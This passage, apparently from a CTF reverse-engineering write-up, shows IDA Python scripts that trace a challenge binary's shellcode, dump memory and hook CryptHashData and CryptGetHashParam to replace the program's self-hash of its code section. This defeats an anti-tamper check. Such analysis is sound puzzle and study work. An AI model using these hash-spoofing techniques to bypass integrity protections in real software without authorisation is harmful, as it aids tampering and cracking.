seg_end)</span><br><span class="line">    os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=<span class="literal">True</span>)</span><br><span class="line">    addrs = <span class="built_in">list</span>(<span class="built_in">range</span>(seg_start, seg_end, STEP))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[trace] creating code &amp; dumping first lines: <span class="subst">&#123;<span class="built_in">len</span>(addrs)&#125;</span> entries ...&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(OUTPUT_PATH, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, newline=<span class="string">&quot;\n&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> ea <span class="keyword">in</span> addrs:</span><br><span class="line">            line = make_code_and_get_line(ea)</span><br><span class="line">            <span class="keyword">if</span> line <span class="keyword">is</span> <span class="literal">None</span>: fp.write(<span class="string">f&quot;<span class="subst">&#123;ea:08X&#125;</span>: &lt;disasm failed&gt;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>: fp.write(<span class="string">f&quot;<span class="subst">&#123;ea:08X&#125;</span>: <span class="subst">&#123;line&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[trace] done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>From the trace, it was found that the shellcode has the behavior of accessing sha256 hash, as previous program hash. Set bp at <code>advapi32_CryptCreateHash</code>, <code>advapi32_CryptHashData</code> and <code>advapi32_CryptGetHashParam</code>, ant it was found that these functions were called at least dozens of times, and each time they were generating a hash of the .text section. Hook hash:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_dbg</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">TEXT_BASE      = <span class="number">0x401000</span></span><br><span class="line">TEXT_LEN       = <span class="number">0x8A00</span></span><br><span class="line">PATCH_DST      = <span class="number">0x40D268</span></span><br><span class="line">CRYPTSP_GHP_RET_EA_ABS = <span class="number">0x720D50D2</span></span><br><span class="line">CRYPT_HASHDATA_NAME_CANDIDATES = [<span class="string">&quot;cryptsp_CryptHashData&quot;</span>, <span class="string">&quot;cryptsp.dll_CryptHashData&quot;</span>, <span class="string">&quot;CryptHashData&quot;</span>]</span><br><span class="line">PATCH_BYTES = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;F6 30 AA 38 D5 72 97 37 5D 64 55 59 C3 34 FD 50 D5 5C A1 D1 77 D2 65 5A 04 23 51 CF 69 24 4B F2&quot;</span>)</span><br><span class="line">g_hooks = <span class="literal">None</span></span><br><span class="line">g_hash_seen_text = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_u32</span>(<span class="params">x</span>): <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg_read_mem</span>(<span class="params">ea, n</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bs = idaapi.dbg_read_memory(ea, n)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(bs) <span class="keyword">if</span> bs <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg_write_mem</span>(<span class="params">ea, data: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ok = idaapi.dbg_write_memory(ea, data)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bool</span>(ok)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ok = ida_dbg.write_dbg_memory(ea, data)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bool</span>(ok)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        buf = <span class="built_in">bytearray</span>(data)</span><br><span class="line">        ok = ida_dbg.write_dbg_memory(ea, buf, <span class="built_in">len</span>(buf))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bool</span>(ok)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg_read_u32</span>(<span class="params">ea</span>):</span><br><span class="line">    bs = dbg_read_mem(ea, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bs <span class="keyword">or</span> <span class="built_in">len</span>(bs) != <span class="number">4</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, bs)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg_write_u32</span>(<span class="params">ea, v</span>): <span class="keyword">return</span> dbg_write_mem(ea, struct.pack(<span class="string">&quot;&lt;I&quot;</span>, _u32(v)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_in_text</span>(<span class="params">pb, cb</span>):</span><br><span class="line">    <span class="keyword">if</span> pb <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> cb <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    start = pb</span><br><span class="line">    end   = pb + cb</span><br><span class="line">    <span class="keyword">return</span> (start &gt;= TEXT_BASE) <span class="keyword">and</span> (end &lt;= (TEXT_BASE + TEXT_LEN))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_module_base</span>(<span class="params">substr: <span class="built_in">str</span></span>):</span><br><span class="line">    substr = substr.lower()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = ida_dbg.get_first_module()</span><br><span class="line">        <span class="keyword">while</span> m:</span><br><span class="line">            name = (<span class="built_in">getattr</span>(m, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).lower()</span><br><span class="line">            <span class="keyword">if</span> substr <span class="keyword">in</span> name: <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">getattr</span>(m, <span class="string">&quot;base&quot;</span>, <span class="number">0</span>))</span><br><span class="line">            m = ida_dbg.get_next_module(m)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resolve_ea_by_names</span>(<span class="params">names</span>):</span><br><span class="line">    <span class="keyword">for</span> nm <span class="keyword">in</span> names:</span><br><span class="line">        ea = idc.get_name_ea_simple(nm)</span><br><span class="line">        <span class="keyword">if</span> ea != idc.BADADDR <span class="keyword">and</span> ea != <span class="number">0</span>: <span class="keyword">return</span> ea</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_bpt</span>(<span class="params">ea</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        idc.add_bpt(ea)</span><br><span class="line">        idc.enable_bpt(ea, <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ida_dbg.add_bpt(ea)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hooks</span>(ida_dbg.DBG_Hooks):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_bpt</span>(<span class="params">self, tid, ea</span>):</span><br><span class="line">        esp = ida_dbg.get_reg_val(<span class="string">&quot;ESP&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> ea == <span class="variable language_">self</span>.crypt_hashdata_ea:</span><br><span class="line">            hHash  = dbg_read_u32(esp + <span class="number">4</span>)</span><br><span class="line">            pbData = dbg_read_u32(esp + <span class="number">8</span>)</span><br><span class="line">            cbData = dbg_read_u32(esp + <span class="number">0xC</span>)</span><br><span class="line">            <span class="keyword">if</span> is_in_text(pbData, cbData):</span><br><span class="line">                g_hash_seen_text.add(hHash)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[hash] tid=<span class="subst">&#123;tid&#125;</span> hHash=0x<span class="subst">&#123;hHash:08X&#125;</span> HASHED_TEXT pb=0x<span class="subst">&#123;pbData:08X&#125;</span> len=0x<span class="subst">&#123;cbData:X&#125;</span>&quot;</span>)</span><br><span class="line">            ida_dbg.continue_process()</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ea == <span class="variable language_">self</span>.crypt_gethashparam_ret_ea:</span><br><span class="line">            hHash    = dbg_read_u32(esp + <span class="number">4</span>)</span><br><span class="line">            dwParam  = dbg_read_u32(esp + <span class="number">8</span>)</span><br><span class="line">            pbOut    = dbg_read_u32(esp + <span class="number">0xC</span>)</span><br><span class="line">            pdwLen   = dbg_read_u32(esp + <span class="number">0x10</span>)</span><br><span class="line">            do_patch = (dwParam == <span class="number">2</span> <span class="keyword">and</span> hHash <span class="keyword">in</span> g_hash_seen_text <span class="keyword">and</span> pbOut == PATCH_DST)</span><br><span class="line">            <span class="keyword">if</span> do_patch:</span><br><span class="line">                ok1 = dbg_write_mem(PATCH_DST, PATCH_BYTES)</span><br><span class="line">                ok2 = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> pdwLen: ok2 = dbg_write_u32(pdwLen, <span class="number">0x20</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[patch] tid=<span class="subst">&#123;tid&#125;</span> hHash=0x<span class="subst">&#123;hHash:08X&#125;</span> patched @0x<span class="subst">&#123;PATCH_DST:08X&#125;</span> bytes_ok=<span class="subst">&#123;ok1&#125;</span> len_ok=<span class="subst">&#123;ok2&#125;</span> (dwParam=HP_HASHVAL)&quot;</span>)</span><br><span class="line">            ida_dbg.continue_process()</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">global</span> g_hooks</span><br><span class="line">    <span class="keyword">if</span> g_hooks <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[patchhash] already started&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    cryptsp_base = find_module_base(<span class="string">&quot;cryptsp&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> cryptsp_base: crypt_gethashparam_ret = cryptsp_base + <span class="number">0x50D2</span></span><br><span class="line">    <span class="keyword">else</span>: crypt_gethashparam_ret = CRYPTSP_GHP_RET_EA_ABS</span><br><span class="line">    crypt_hashdata_ea = resolve_ea_by_names(CRYPT_HASHDATA_NAME_CANDIDATES)</span><br><span class="line">    <span class="keyword">if</span> crypt_hashdata_ea <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[patchhash] WARNING: cannot resolve cryptsp_CryptHashData by name.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[patchhash] Please rename it or set its EA manually in the script.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> add_bpt(crypt_hashdata_ea):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[patchhash] failed to add bpt @ 0x<span class="subst">&#123;crypt_hashdata_ea:08X&#125;</span> (CryptHashData)&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> add_bpt(crypt_gethashparam_ret):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[patchhash] failed to add bpt @ 0x<span class="subst">&#123;crypt_gethashparam_ret:08X&#125;</span> (GetHashParam RET)&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    g_hooks = Hooks()</span><br><span class="line">    g_hooks.crypt_hashdata_ea = crypt_hashdata_ea</span><br><span class="line">    g_hooks.crypt_gethashparam_ret_ea = crypt_gethashparam_ret</span><br><span class="line">    g_hooks.hook()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[patchhash] started.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  CryptHashData EA      = 0x<span class="subst">&#123;crypt_hashdata_ea:08X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  GetHashParam RET EA   = 0x<span class="subst">&#123;crypt_gethashparam_ret:08X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  TEXT region           = 0x<span class="subst">&#123;TEXT_BASE:08X&#125;</span> .. 0x<span class="subst">&#123;(TEXT_BASE+TEXT_LEN):08X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  PATCH dst             = 0x<span class="subst">&#123;PATCH_DST:08X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  PATCH bytes len       = <span class="subst">&#123;<span class="built_in">len</span>(PATCH_BYTES)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stop</span>():</span><br><span class="line">    <span class="keyword">global</span> g_hooks</span><br><span class="line">    <span class="keyword">if</span> g_hooks:</span><br><span class="line">        <span class="keyword">try</span>: g_hooks.unhook()</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">        g_hooks = <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[patchhash] stopped.&quot;</span>)</span><br><span class="line"></span><br><span class="line">start()</span><br></pre></td></tr></table></figure>

<p>Mix:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_dbg</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">BREAK_EA        = <span class="number">0x00404010</span></span><br><span class="line">OUTPUT_PATH     = <span class="string">r&quot;E:\CTF\temp\dump.bin&quot;</span></span><br><span class="line">READ_SIZE       = <span class="number">0x10</span></span><br><span class="line">PAD_SIZE        = <span class="number">0x10</span></span><br><span class="line">APPEND_OUTPUT   = <span class="literal">False</span></span><br><span class="line">DEDUP_CONSECUTIVE = <span class="literal">True</span></span><br><span class="line">MAX_DUMPS       = <span class="number">0</span></span><br><span class="line">TEXT_BASE       = <span class="number">0x00401000</span></span><br><span class="line">TEXT_LEN        = <span class="number">0x8A00</span></span><br><span class="line">PATCH_DST       = <span class="number">0x0040D268</span></span><br><span class="line">CRYPTSP_GHP_RET_EA_ABS = <span class="number">0x720D50D2</span></span><br><span class="line">CRYPT_HASHDATA_NAME_CANDIDATES = [<span class="string">&quot;cryptsp_CryptHashData&quot;</span>, <span class="string">&quot;cryptsp.dll_CryptHashData&quot;</span>, <span class="string">&quot;CryptHashData&quot;</span>]</span><br><span class="line">HP_HASHVAL = <span class="number">2</span></span><br><span class="line">PATCH_BYTES = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;F6 30 AA 38 D5 72 97 37 5D 64 55 59 C3 34 FD 50 D5 5C A1 D1 77 D2 65 5A 04 23 51 CF 69 24 4B F2&quot;</span>)</span><br><span class="line">g_hooks = <span class="literal">None</span></span><br><span class="line">g_fp = <span class="literal">None</span></span><br><span class="line">g_hash_seen_text = <span class="built_in">set</span>()</span><br><span class="line">g_last_dump16 = <span class="literal">None</span></span><br><span class="line">g_dump_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_execute_sync</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="keyword">try</span>: ida_kernwin.execute_sync(fn, ida_kernwin.MFF_FAST)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">try</span>: fn()</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_continue</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ida_dbg.continue_process()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e: <span class="built_in">print</span>(<span class="string">f&quot;[mix] continue failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg_read_mem</span>(<span class="params">ea, size</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bs = idaapi.dbg_read_memory(ea, size)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(bs) <span class="keyword">if</span> bs <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg_write_mem</span>(<span class="params">ea, data: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ok = idaapi.dbg_write_memory(ea, data)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bool</span>(ok)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg_read_u32</span>(<span class="params">ea</span>):</span><br><span class="line">    bs = dbg_read_mem(ea, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bs <span class="keyword">or</span> <span class="built_in">len</span>(bs) != <span class="number">4</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, bs)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg_write_u32</span>(<span class="params">ea, v</span>): <span class="keyword">return</span> dbg_write_mem(ea, struct.pack(<span class="string">&quot;&lt;I&quot;</span>, v &amp; <span class="number">0xFFFFFFFF</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_in_text</span>(<span class="params">pb, cb</span>):</span><br><span class="line">    <span class="keyword">if</span> pb <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> cb <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> (pb &gt;= TEXT_BASE) <span class="keyword">and</span> ((pb + cb) &lt;= (TEXT_BASE + TEXT_LEN))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_module_base</span>(<span class="params">substr: <span class="built_in">str</span></span>):</span><br><span class="line">    substr = substr.lower()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = ida_dbg.get_first_module()</span><br><span class="line">        <span class="keyword">while</span> m:</span><br><span class="line">            name = (<span class="built_in">getattr</span>(m, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).lower()</span><br><span class="line">            <span class="keyword">if</span> substr <span class="keyword">in</span> name: <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">getattr</span>(m, <span class="string">&quot;base&quot;</span>, <span class="number">0</span>))</span><br><span class="line">            m = ida_dbg.get_next_module(m)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resolve_ea_by_names</span>(<span class="params">names</span>):</span><br><span class="line">    <span class="keyword">for</span> nm <span class="keyword">in</span> names:</span><br><span class="line">        ea = idc.get_name_ea_simple(nm)</span><br><span class="line">        <span class="keyword">if</span> ea != idc.BADADDR <span class="keyword">and</span> ea != <span class="number">0</span>: <span class="keyword">return</span> ea</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_bpt</span>(<span 